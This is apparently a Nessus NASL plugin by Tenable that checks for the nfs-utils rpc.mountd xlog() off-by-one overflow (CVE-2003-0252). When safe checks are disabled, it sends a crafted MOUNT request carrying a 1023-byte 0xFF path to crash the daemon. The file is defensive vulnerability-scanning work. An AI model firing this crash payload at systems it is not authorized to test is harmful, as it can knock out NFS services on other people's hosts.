# 
# (C) Tenable Network Security
#
#
# This check is destructive by its very nature, as we need to check for a 
# off-by-one overflow. Very few distributions are actually affected,
# in spite of all the advisories that have been published, as the exploitability
# of this flaw actually depends on the version of gcc which has been used
# to compile nfs-utils.
#

if(description)
{
 script_id(11800);
 script_bugtraq_id(8179);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2003-0252");
 if ( defined_func("script_xref") ) script_xref(name:"RHSA", value:"RHSA-2003:206-01");
 if ( defined_func("script_xref") ) script_xref(name:"SuSE", value:"SUSE-SA:2003:031");

 
 name["english"] = "Linux nfs-utils xlog() off-by-one overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote rpc.mountd daemon is vulnerable to an off-by-one overflow
which may be exploited by an attacker to gain a root shell on this
host.

Solution : Upgrade to the latest version of nfs-utils
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for NFS";
 summary["francais"] = "Vérifie les partitions NFS";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 
 family["english"] = "Gain root remotely";
 script_family(english:family["english"]);
 script_dependencie("rpc_portmap.nasl", "showmount.nasl", "os_fingerprint.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}



include("misc_func.inc");
include("nfs_func.inc");
include("global_settings.inc");

#
# Returns <1> if the remote mountd replies anything to our
# requests.
#
function zmount(soc, share)
{
  local_var pad, req, len, r, ret, i;
  
  pad = padsz(len:strlen(this_host_name()));
  len = 52 + strlen(this_host_name()) + pad;
  
  req = 	   rpclong(val:rand()) +
  		   rpclong(val:0) +
		   rpclong(val:2) +
		   rpclong(val:100005) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:1) +
		   rpclong(val:len) +
		   rpclong(val:rand()) +
		   rpclong(val:strlen(this_host_name())) +
		   this_host_name() +
		   rpcpad(pad:pad) +
		   rpclong(val:0)  +	
		   rpclong(val:0)  +	
		   rpclong(val:7)  +	
		   rpclong(val:0)  +	
		   rpclong(val:2)  + 	
		   rpclong(val:3)  +	
		   rpclong(val:4)  +
		   rpclong(val:5)  +
		   rpclong(val:20) +
		   rpclong(val:31) +
		   rpclong(val:0)  +	
		   rpclong(val:0)  +
		   rpclong(val:0)  +
					
		   rpclong(val:strlen(share)) +
		   share +
		   rpcpad(pad:padsz(len:strlen(share)));
		   
  send(socket:soc, data:req);
  r = recv(socket:soc, length:4096);
  if(strlen(r) > 0) return(1);
  else return(0);
}



port = get_rpc_port(program:100005, protocol:IPPROTO_UDP);
if ( ! port ) exit(0);
soc = open_priv_sock_udp(dport:port);
if(!soc)exit(0);

if(safe_checks())
{
 os = get_kb_item("Host/OS/icmp");
 if(os && "Linux 2.4" >!< os)exit(0);
 
 if(zmount(soc:soc, share:"/nessus"))
 {

  if ( report_paranoia < 2 ) exit(0);
  rep = "
The remote rpc.mountd daemon might be vulnerable to an off-by-one overflow
which may be exploited by an attacker to gain a root shell on this
host.

*** Since safe checks are enabled, Nessus did not actually check
*** for this flaw, so it might be a false positive.
*** At this time, this flaw is known to affect only older Linux distributions
*** such as RedHat 6.1 or 6.2.

Solution : Upgrade to the latest version of nfs-utils
Risk factor : High"; 

 security_hole(port:port, data:rep);
 }
 close(soc);
 exit(0);
}

if(zmount(soc:soc, share:"/nessus"))
{
 zmount(soc:soc, share:"/" + crap(length:1023, data:raw_string(0xFF)));
 if(zmount(soc:soc, share:"/nessus") == 0 )
 {
  security_hole(port);
 }
}

close(soc);
